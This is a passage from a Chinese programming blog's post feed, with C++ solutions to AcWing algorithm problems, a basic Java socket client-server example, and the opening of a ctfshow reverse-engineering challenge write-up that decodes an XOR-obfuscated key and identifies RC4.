href="#3745-牛的学术圈-I-AcWing题库" class="headerlink" title="3745. 牛的学术圈 I - AcWing题库"></a><a href="https://www.acwing.com/problem/content/3748/">3745. 牛的学术圈 I - AcWing题库</a></h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>记录一下引用次数的分布，然后遍历判断一下在何处引用之后能够得到最合适的<code>ans</code>即可</p><h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,l,x;<br>    cin&gt;&gt;n&gt;&gt;l;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        cin&gt;&gt;x;<br>        cnt[x]++;<br>    &#125;<br>    <span class="hljs-type">int</span> ans;<br>    x=n;<br>    <span class="hljs-keyword">for</span>(ans=<span class="hljs-number">0</span>; ans&lt;n; ans++)<br>    &#123;<br>        x-=cnt[ans];<br>        <span class="hljs-keyword">if</span>(x+<span class="hljs-built_in">min</span>(cnt[ans], l) &lt;= ans)   <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="1442-单词处理器-AcWing题库"><a href="#1442-单词处理器-AcWing题库" class="headerlink" title="1442. 单词处理器 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/1444/">1442. 单词处理器 - AcWing题库</a></h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>模拟题，按照题目给出的思路编程即可，需要注意控制括号的输出范围，即在开头，结尾均不输出</p><h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    string s;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        cin&gt;&gt;s;<br>        <span class="hljs-keyword">if</span>(cnt + s.<span class="hljs-built_in">size</span>() &gt; k)<br>        &#123;<br>            cout&lt;&lt;endl;<br>            cnt=<span class="hljs-number">0</span>;<br>            cout&lt;&lt;s;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(cnt!=<span class="hljs-number">0</span>)   cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;s;<br>        <span class="hljs-keyword">else</span>    cout&lt;&lt;s;<br>        cnt+=s.<span class="hljs-built_in">size</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h1><h2 id="AcWing-1902-马拉松"><a href="#AcWing-1902-马拉松" class="headerlink" title="AcWing 1902. 马拉松"></a><a href="https://www.acwing.com/problem/content/1904/">AcWing 1902. 马拉松</a></h2><p>每次路程改变只对前后两点间距离有影响，因此每次都判断当前三个点之间的距离之和与去掉中间点的距离哪个更优即可，最后取最大值作为结果输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><br><span class="hljs-type">int</span> x[N], y[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dis</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(x[a] - x[b]) + <span class="hljs-built_in">abs</span>(y[a] - y[b]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n, s=<span class="hljs-number">0</span>, mx=<span class="hljs-number">0</span>;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        cin&gt;&gt;x[i]&gt;&gt;y[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>        s+=<span class="hljs-built_in">dis</span>(i<span class="hljs-number">-1</span>, i);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n<span class="hljs-number">-1</span>;i++)<br>        mx = <span class="hljs-built_in">max</span>(mx, <span class="hljs-built_in">dis</span>(i<span class="hljs-number">-1</span>, i) + <span class="hljs-built_in">dis</span>(i+<span class="hljs-number">1</span>, i) - <span class="hljs-built_in">dis</span>(i<span class="hljs-number">-1</span>, i+<span class="hljs-number">1</span>));<br>    cout&lt;&lt;s-mx;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AcWing第42场周赛</title>
      <link href="/2022/03/ad9e07e4.html"/>
      <url>/2022/03/ad9e07e4.html</url>
      
        <content type="html"><![CDATA[<h1 id="4311-最小值"><a href="#4311-最小值" class="headerlink" title="4311. 最小值"></a><a href="https://www.acwing.com/problem/content/4314/">4311. 最小值</a></h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>枚举暴力出奇迹</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-type">double</span> res=<span class="hljs-number">0x3f3f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">double</span> a,b;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        res = <span class="hljs-built_in">min</span>(res, a/b);<br>    &#125;<br>    res*=m;<br>    <span class="hljs-comment">//cout&lt;&lt;res&lt;&lt;endl;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6lf&quot;</span>, res);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4312-出现次数"><a href="#4312-出现次数" class="headerlink" title="4312. 出现次数"></a><a href="https://www.acwing.com/problem/content/4315/">4312. 出现次数</a></h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>前缀和思想，记录字符串在前i个字符里面有多少个子串，然后根据输入的区间进行相减即可得出结果，特别注意数组操作的边界</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> m,n,q;<br>string S,T;<br><span class="hljs-type">int</span> s[<span class="hljs-number">1010</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br>    cin&gt;&gt;S&gt;&gt;T;<br>    S= <span class="hljs-string">&#x27; &#x27;</span>+ S;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=m;i&lt;=n;i++)<br>    &#123;<br>        s[i] = s[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-keyword">if</span>(S.<span class="hljs-built_in">substr</span>(i-m+<span class="hljs-number">1</span>, m) == T)<br>        &#123;<br>            s[i]++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//for(int i=0;i&lt;=n;i++)   cout&lt;&lt;i&lt;&lt;&quot;: &quot;&lt;&lt;s[i]&lt;&lt;endl;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;q;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r;<br>        cin&gt;&gt;l&gt;&gt;r;<br>        l+= m<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span>(l &gt; r)   cout&lt;&lt;<span class="hljs-number">0</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;s[r]-s[l - <span class="hljs-number">1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="AcWing-4313-满二叉树等长路径"><a href="#AcWing-4313-满二叉树等长路径" class="headerlink" title="AcWing 4313. 满二叉树等长路径"></a><a href="https://www.acwing.com/problem/content/4316/">AcWing 4313. 满二叉树等长路径</a></h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>画图可知对于满二叉树要求增加路径长度且要保证两边平衡，易证得按照自顶向下的优先度进行边长度添加所增加的路径长度最小，如果自下部进行添加则需要在各级父节点路径添加相应长度以保证树长度平衡。</p><p>其次，由提议可知在保证增加路径最小的前提下增加的长度为$d&#x3D;max(x, y)$，则需要添加的长度可列式<br>$$<br>ans&#x3D;d-x+d-y\<br>&#x3D; 2d-(x+y)\<br>&#x3D; |x-y|<br>$$<br>因此，根据上面式子，我们只需要保证各个子树自身平衡即可，而不用考虑当前节点的兄弟节点内部情况，由此得解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">2050</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> ans;<br><span class="hljs-type">int</span> w[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u * <span class="hljs-number">2</span> &gt; (<span class="hljs-number">1</span>&lt;&lt;n+<span class="hljs-number">1</span>) - <span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> l = <span class="hljs-built_in">dfs</span>(u*<span class="hljs-number">2</span>) + w[u*<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> r = <span class="hljs-built_in">dfs</span>(u*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>) + w[u*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>];<br>    ans+=<span class="hljs-built_in">abs</span>(l-r);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(l, r);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=(<span class="hljs-number">1</span>&lt;&lt;n+<span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i++)   cin&gt;&gt;w[i];<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA网络编程基础</title>
      <link href="/2022/03/9f68f09f.html"/>
      <url>/2022/03/9f68f09f.html</url>
      
        <content type="html"><![CDATA[<p>这篇文章主要用来总结Java在网络编程中的知识点</p><p>下面是一个Java客户端与服务端通信的样例程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ServerSocket</span> <span class="hljs-variable">ss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(<span class="hljs-number">6666</span>);<br>        System.out.println(<span class="hljs-string">&quot;Server start listening...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">sock</span> <span class="hljs-operator">=</span> ss.accept();<br>            System.out.println(<span class="hljs-string">&quot;Receviced package from &quot;</span> + sock.getRemoteSocketAddress());<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(sock);<br>            t.start();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Handler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<br>    Socket sock;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Handler</span><span class="hljs-params">(Socket sock)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sock = sock;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.sock.getInputStream()) &#123;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.sock.getOutputStream()) &#123;<br>                handle(input, output);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.sock.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;Client disconnected.&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(InputStream input, OutputStream output)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(output, StandardCharsets.UTF_8));<br>        <span class="hljs-type">var</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, StandardCharsets.UTF_8));<br>        writer.write(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>        writer.flush();<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> reader.readLine();<br>            <span class="hljs-keyword">if</span> (s.equals(<span class="hljs-string">&quot;bye&quot;</span>)) &#123;<br>                writer.write(<span class="hljs-string">&quot;bye\n&quot;</span>);<br>                writer.flush();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            writer.write(<span class="hljs-string">&quot;ok: &quot;</span> + s + <span class="hljs-string">&quot;\n&quot;</span>);<br>            writer.flush();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//client</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">sock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">6666</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> sock.getInputStream())&#123;<br>            <span class="hljs-keyword">try</span>(<span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> sock.getOutputStream())&#123;<br>                handle(input, output);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(InputStream input, OutputStream output)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(output, StandardCharsets.UTF_8));<br>        <span class="hljs-type">var</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, StandardCharsets.UTF_8));<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;[server]: &quot;</span>+ reader.readLine());<br>        <span class="hljs-keyword">for</span>(;;)&#123;<br>            System.out.print(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> scanner.nextLine();<br>            writer.write(s);<br>            writer.newLine();<br>            writer.flush();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> reader.readLine();<br>            System.out.println(<span class="hljs-string">&quot;&lt;&lt;&lt;&quot;</span> + resp);<br>            <span class="hljs-keyword">if</span>(resp.equals(<span class="hljs-string">&quot;bye&quot;</span>))  <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现功能为服务端与客户端相互通信，收到<code>bye</code>信号后断开连接，如图所示</p><p><img src="https://image.0error.net/img/2022/20220308161211.png" alt="java_net_example1_result"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> network </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-REVERSE-刷题记录</title>
      <link href="/2022/03/1bdb2719.html"/>
      <url>/2022/03/1bdb2719.html</url>
      
        <content type="html"><![CDATA[<h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1><p>打开初步分析为32位程序，无壳，拖入IDA32分析</p><p><img src="https://image.0error.net/20220303165744.png" alt="re2_main"></p><p>找到关键行47-50，分析得出各函数内部的基本作用如图所示</p><p>首先进入分析输入后的处理<img src="https://image.0error.net/20220303165942.png" alt="re2_401A70"></p><p>可以很明显看出，是对输入的字符串进行处理后再操作，因此根据这个思路写出脚本，得到这里的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><br>user = <span class="hljs-string">&quot;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">29</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(user[x])==y^<span class="hljs-number">0x1f</span>):<br>            flag+=<span class="hljs-built_in">chr</span>(y)<br><br><span class="hljs-built_in">print</span>(flag) <span class="hljs-comment">#[Warnning]Access_Unauthorized</span><br></code></pre></td></tr></table></figure><p>接着分析加密函数，对加密函数内各函数分析后可得出大致为RC4，因此只要根据给出的加密内容进行逆向解密即可</p><p><img src="https://image.0error.net/20220303170741.png" alt="re2_4014E0"></p><p>但是这里加密后的是什么内容是什么不清楚，我盲猜是给出的压缩文件里面的文本，但是这里没有科学依据，后来看到一篇大师傅的WP，他的分析是程序在最初会对<code>enflag.txt</code>的内容进行<code>fopen() w</code>操作，这样会清楚里面的文本，照此来看里面的东西其实没有被用过，因此可以推断他就是要加密的原始文本，因此在同目录下创建<code>flag.txt</code>，放入文本，解密成功。</p><p><img src="https://image.0error.net/20220303171146.png" alt="re2_flag"></p><h1 id="r2"><a href="#r2" class="headerlink" 